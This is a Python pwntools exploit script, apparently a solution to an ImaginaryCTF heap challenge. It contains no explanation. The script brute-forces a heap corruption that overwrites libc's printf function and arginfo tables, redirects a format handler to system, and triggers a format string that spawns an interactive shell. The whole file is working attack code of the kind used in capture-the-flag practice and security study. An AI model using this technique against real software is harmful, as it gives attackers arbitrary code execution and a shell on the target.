#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF("./vuln")
libc = ELF("libc.so.6")

def alloc(idx, size, stuff):
  conn.sendline(b"p")
  conn.recvuntil(b"idx:")
  conn.sendline(str(idx).encode())
  conn.recvuntil(b":")
  conn.sendline(str(size).encode())
  conn.recvuntil(b":")
  conn.send(stuff)

def free(idx, keep=False):
  conn.sendline(b"b")
  conn.recvuntil(b"idx:")
  conn.sendline(str(idx).encode())
  conn.recvuntil(b"?")
  if keep:
    conn.sendline(b"y")
  else:
    conn.sendline(b"n")

def edit(idx, stuff):
  conn.sendline(b"r")
  conn.recvuntil(b"idx:")
  conn.sendline(str(idx).encode())
  conn.recvuntil(b":")
  conn.send(stuff)

def printf(idx):
  conn.sendline(b"l")
  conn.recvuntil(b"idx:")
  conn.sendline(str(idx).encode())

def otos(off):
  return off*2 - 0x10

while True: # 4 bit bruteforce
  conn = elf.process()
#  conn = remote("minecraft.chal.imaginaryctf.org", 1337); conn.recvline()
  alloc(0, 0x600, b"0000\n")
  alloc(1, otos(libc.sym.__printf_function_table-libc.sym.main_arena), b"1111\n")
  alloc(2, otos(libc.sym.__printf_arginfo_table-libc.sym.main_arena), b'a'*504 + p64(elf.sym.system))
  alloc(3, 0x600, b"%." + str(u16(b'sh')).encode() + b"A\n\0")
  alloc(4, 0x600, b"2222\n")
  free(0, keep=True)
  edit(0, b"a"*8 + b'\x30\x39')
  try:
    alloc(5, 0x600, b"5555")
    free(1)
    free(2)
    printf(3)
    conn.interactive()
    conn.close()
    break
  except:
    conn.close()
